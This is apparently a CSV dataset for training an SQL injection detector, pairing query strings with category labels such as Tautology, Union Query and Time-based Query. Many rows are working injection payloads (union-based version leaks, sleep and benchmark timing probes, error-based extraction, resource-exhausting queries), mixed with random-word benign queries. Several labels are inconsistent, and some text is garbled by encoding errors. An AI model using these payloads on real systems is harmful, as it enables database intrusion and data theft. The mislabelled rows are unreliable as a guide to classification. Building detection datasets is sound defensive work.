knownpatterns,category
SELECT TOP 3 * FROM private WHERE track = 'everyone',Tautology
"""  SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )  """,Tautology
- 1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,Tautology
1'||  (  select 'hkvl' from dual where 8882  =  8882,Tautology
SELECT rich ( s )  FROM sail UNION ALL,Union Query
SELECT AVG ( constantly ) FROM nation SELECT SUM ( forget ) ,Illegal/Logically incorrect query
1'  )   as cdrm where 4595  =  4595 order by 1#,Tautology
"""1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
"""1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
SELECT largest FROM those UNION SELECT per FROM result ORDER BY pretty,Union Query
SELECT * FROM negative ORDER BY smallest DESC,Tautology
""" select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'""",Union Query
SELECT * FROM strong WHERE NOT swam = 'from'  AND NOT deal = 'cloth',Tautology
SELECT * FROM  ( SELECT production FROM golden ) ,Tautology
"""1"""" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and """"tfok"""" like """"tfok""",Alternate Encoding
SELECT AVG ( Price ) FROM produce,Illegal/Logically incorrect query
1'+  (  select 'qxmo' where 9511=  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,Time-based Query
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,Tautology
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",Time-based Query
"""  SELECT roundID AS ID, our AS soon FROM writing""",Tautology
 UNION SELECT,Union Query
""" select * from users where id=1 or @#""""  (  =1 or 1=1-- 1""""",Tautology
SELECT * FROM brain WHERE guard = 'political',Tautology
"""1'  )   where 9304  =  9304 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
1  )   as bozx where 2160  =  2160 and sleep  (  5  )  #,Time-based Query
-8378%'  )   union all select 5491#,Union Query
""" SELECT column_name ( s )  FROM stretch,fall""",Tautology
"""1""""   )    )    as dooi where 1806=1806 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
"""1',iif  (  6625  =  6625/0  )  """,Tautology
DELETE FROM wrong WHERE picture = 'dinner',Tautology
"""-3492"""" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --""",Tautology
"""1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )  # usus""",Stored Procedure
"""1%""""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT * FROM excitement WHERE independent LIKE '%position%',Tautology
"""   SELECT COUNT ( additional ) , listen FROM believed BY sort""",Illegal/Logically incorrect query
x' AND 1=(SELECT COUNT(*) FROM tabname); --,Illegal/Logically incorrect query
SELECT COUNT ( luck ) FROM off,Illegal/Logically incorrect query
"""   SELECT small, church, memberFROM naturally WHERE up  IS NOT NULL""",Tautology
SELECT bigger ( s )  FROM mighty UNION ALL,Union Query
"""1%' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '""",Illegal/Logically incorrect query
SELECT * FROM bridge WHERE friend = 'captured'  AND City = 'country',Illegal/Logically incorrect query
"""1""""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   """"nsyl""""  =  """"nsyl""",Tautology
SELECT * FROM flew FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM airplane,Tautology
"""  SELECT felt,seen FROM away WHERE fur = 'lie' UNION SELECT enemy, charge FROM become""",Union Query
"""1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5cx7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   x717a767a71   )    )     )   and    (    (   'asdc' like 'asdc""",Stored Procedure
"""   SELECT temperature, which, leaving FROM correctly WHERE mysterious  IS NULL""",Tautology
""" select * from users where id=1 or """"{?"""" or 1=1-- 1""""",Tautology
""" SELECT * FROM putting ORDER BY thought, nice""",Tautology
SELECT * FROM tell WHERE article = 'value' LIMIT 3,Tautology
"""   SELECT alone,saw,say,close,noise     (  (  physical JOIN afternoon ON perfectly.lonely =  shore.hope )   INNER JOIN castON Orders.leader =  coal.serviceID ) """,Tautology
"""select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   3508  =  3508""",Illegal/Logically incorrect query
SELECT COUNT ( DISTINCT closer )  FROM pipe,Illegal/Logically incorrect query
SELECT AVG ( writing )  FROM bad  SELECT SUM ( shout ) ,Illegal/Logically incorrect query
1'||  (  select 'flbv' where 7451=  7451 and 4595  =  4595#,Tautology
"""  SELECT becameID AS ID, common AS shoe FROM now""",Tautology
1 and sleep  (  5  )  -- ruuv,Time-based Query
SELECT shout ( s )  FROM themselves,Tautology
SELECT tank ( s )  FROM classroom FULL OUTER JOIN,Tautology
SELECT * FROM early WHERE kept NOT LIKE '[satellites]%',Tautology
SELECT DISTINCT ice FROM cowboy,Tautology
"""1%""""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  """"%""""  =  """"""",Alternate Encoding
'%20or%20'x'='x,Tautology
SELECT laid FROM anything,Tautology
//,Tautology
SELECT * FROM brain WHERE gasoline = 'who',Tautology
"""  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him""",Tautology
"""1'  )   union all select null,null,null#""",Union Query
SELECT * FROM blow ORDER BY cattle,Tautology
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",Time-based Query
"""1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )  #""",Alternate Encoding
SELECT * FROM sides FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
"""1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #""",Alternate Encoding
SELECT chemical ( s )  FROM coat UNION,Union Query
SELECT COUNT ( DISTINCT facing )  FROM fifty,Illegal/Logically incorrect query
"""1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
admin'  )   or   (  '1'  =  '1'#,Tautology
"""1'||  (  select 'ryyc' from dual where 5196  =  5196 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null   )    )   ||'""",Illegal/Logically incorrect query
-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj,Tautology
1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,Tautology
"""1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp""",Alternate Encoding
"""-7611  )   as tuje where 6101=  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--""",Union Query
"""1 where 3175  =  3175 or 8421=    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",Union Query
"""1"""" union all select null,null,null,null,null,null,null--""",Union Query
SELECT very ( s FROM slightly RIGHT JOIN,Tautology
SELECT * FROM individual WHERE slip  BETWEEN 10 AND 20,Tautology
"""   SELECT Employees.report, COUNT ( Orders.withinID )  AS thingFROM    ( OrdersINNER JOIN cookies ON Orders.hunterID  =  Employees.shownID ) """,Illegal/Logically incorrect query
SELECT fought ( s )  FROM planned,Tautology
SELECT peace ( s )  FROM aware UNION ALL,Union Query
"""1"""" and sleep  (  5  )  #""",Time-based Query
"""-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --""",Tautology
SELECT * FROM planning WHERE meal = 'property',Tautology
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",Union Query
"""call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and    (    (   """"pawh""""  =  """"pawh""",Illegal/Logically incorrect query
SELECT * FROM current  WHERE satellites NOT LIKE '[worker]%',Tautology
 UPDATE sit SET silly = 'high'WHERE wealth = 'collect',Tautology
SELECT TOP 3 * FROM attached WHERE wrong = 'sign' SELECT * FROM easily,Tautology
"""  SELECT art,announced,dug FROM verb LEFT JOIN Orders ON solve.compositionID =  tax.general ORDER BY railroad.dangerous""",Tautology
SELECT AVG ( darkness ) FROM women,Illegal/Logically incorrect query
DELETE FROM frighten WHERE ordinary = 'fine',Tautology
SELECT COUNT ( told ) FROM slowly,Illegal/Logically incorrect query
"""1"""" where 7015  =  7015""",Tautology
"""-4865 where 1386=1386 union all select 1386386386386#""",Union Query
1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,Time-based Query
SELECT AVG ( harbor ) FROM sad SELECT SUM ( question ) ,Illegal/Logically incorrect query
"""1"""" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and """"icow"""" like """"icow""",Tautology
SELECT * FROM married,Tautology
SELECT * FROM positive WHERE shinning IN  ( SELECT position FROM bill ) ,Tautology
1 where 7882  =  7882,Tautology
SELECT * FROM deeply,Tautology
SELECT closer ( s )  FROM numeral UNION,Union Query
""" select * from users where id=1 +  (  1  )   union select null,banner from v$version where rownum=1-- 1""""",Union Query
1'||  (  select 'gmkp' where 6016  =  6016,Tautology
"""   SELECT grabbed,ten,clay,almost,one     (  (  cake JOIN cattle ON steep.worried =  not.seeing )   INNER JOIN stormON Orders.did =  film.wrappedID ) """,Tautology
SELECT AVG ( space ) FROM live SELECT SUM ( party ) ,Illegal/Logically incorrect query
SELECT * FROM can  WHERE widely NOT LIKE '[meant]%',Tautology
"""1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --""",Illegal/Logically incorrect query
"""; if not  (  substring   (    (   select @@version  )  ,25  )   <> 0  )   waitfor delay '0:0:2' --""",Illegal/Logically incorrect query
SELECT * FROM herd WHERE NOT myself = 'hold'  AND NOT control = 'mission',Tautology
SELECT COUNT ( stateID ) FROM account,Illegal/Logically incorrect query
SELECT TOP 3 * FROM house WHERE naturally = 'area',Tautology
"""1' where 5251=  5251 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --""",Illegal/Logically incorrect query
SELECT * FROM women WHERE Price NOT BETWEEN 10 AND 20,Tautology
SELECT COUNT ( result ) FROM gentle,Illegal/Logically incorrect query
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,Tautology
 AND 1=1,Tautology
//*,Tautology
"""1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
"""  SELECT faster,cross,eventually FROM enter LEFT JOIN Orders ON accurate.plateID =  job.found ORDER BY baby.period""",Tautology
SELECT AVG ( base ) FROM note,Illegal/Logically incorrect query
"""-8106%""""  )   union all select 2051,2051,2051,2051,2051,2051#""",Union Query
SELECT * FROM student WHERE replace  BETWEEN 10 AND 20,Tautology
"""1"""" where 9804  =  9804 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'""",Tautology
"""1%""""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  """"%""""  =  """"""",Time-based Query
SELECT * FROM television WHERE yesterday NOT LIKE 'other%',Tautology
"""-7333%""""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  """"%""""  =  """"""",Tautology
1  )   where 2010  =  2010,Tautology
SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',Tautology
SELECT TOP 3 * FROM article WHERE expression = 'alphabet',Tautology
SELECT COUNT ( DISTINCT electricity )  FROM design,Illegal/Logically incorrect query
insert,Tautology
"""   SELECT Employees.exchange, COUNT ( Orders.whoID )  AS storyFROM    ( OrdersINNER JOIN time ON Orders.zebraID  =  Employees.endID ) """,Illegal/Logically incorrect query
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",Time-based Query
SELECT AVG ( Price ) FROM silk,Illegal/Logically incorrect query
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20,Tautology
-2411 or   (  8459  =  8459  )  *4906# pxwg,Tautology
SELECT * FROM sunlight WHERE tired = 'coming'  AND City = 'watch',Illegal/Logically incorrect query
 (  case when 2646  =  8520 then 2646 else null end  ) ,Tautology
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,Alternate Encoding
ORDER BY 25#,Tautology
SELECT sudden ( s )  FROM worry UNION,Union Query
') or true--,Tautology
- 1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu,Tautology
"""   SELECT COUNT ( forget ) , appearance FROM say BY flame""",Illegal/Logically incorrect query
"""1""""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  """"hiwo"""" like """"hiwo""",Alternate Encoding
SELECT * FROM blind WHERE order NOT LIKE 'century%',Tautology
"""select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4""",Illegal/Logically incorrect query
SELECT * FROM ordinary,Tautology
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",Time-based Query
SELECT * FROM doll WHERE paragraph IN  ( SELECT seems FROM like ) ,Tautology
"""1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf""",Tautology
"""   SELECT Employees.guess, COUNT ( Orders.wishID )  AS moreFROM    ( OrdersINNER JOIN lesson ON Orders.carriedID  =  Employees.effectID ) """,Illegal/Logically incorrect query
SELECT * FROM  ( SELECT compare FROM private ) ,Tautology
SELECT morning ( s FROM skin RIGHT JOIN,Tautology
"""-7008'   )    )    union all select 9080,9080,9080#""",Union Query
select   (  case when   (  8331=  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #,Tautology
1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',Alternate Encoding
SELECT * FROM with ORDER BY science,Tautology
SELECT * FROM  ( SELECT start FROM production ) ,Tautology
""" select * from users where id=1 or 1#""""$ union select 1,version  (    )   -- 1""",Union Query
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect',Tautology
SELECT TOP 3 * FROM giant WHERE tomorrow = 'lunch' SELECT * FROM sudden,Tautology
"""  SELECT * FROM drove WHERE imagine NOT IN  ( 'national', 'private', 'company' )  """,Tautology
SELECT last ( s )  FROM bank UNION ALL,Union Query
"""-2263'  )   where 7931=  7931 union all select 7931,7931,7931--""",Union Query
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",Time-based Query
1' in boolean mode  )   union all select null#,Union Query
""" SELECT OrderID, Quantity, CASE Ã‚Â Ã‚Â Ã‚Â  WHEN Quantity > 30 THEN 'The quantity is greater than 30' Ã‚Â Ã‚Â Ã‚Â  WHEN Quantity  =  30 THEN 'The quantity is 30' Ã‚Â Ã‚Â Ã‚Â  ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;""",Tautology
SELECT * FROM Customers  WHERE Country = 'Germany' AND  ( City = 'Berlin' OR City = 'MÃƒÂ¼nchen' ) ;,Illegal/Logically incorrect query
"""-6611%""""   )    )     )   union all select 8918,8918#""",Union Query
"""-6263"""" union all select 8005,8005#""",Union Query
"""))))) waitfor delay '0:0:20' /*",Time-based Query
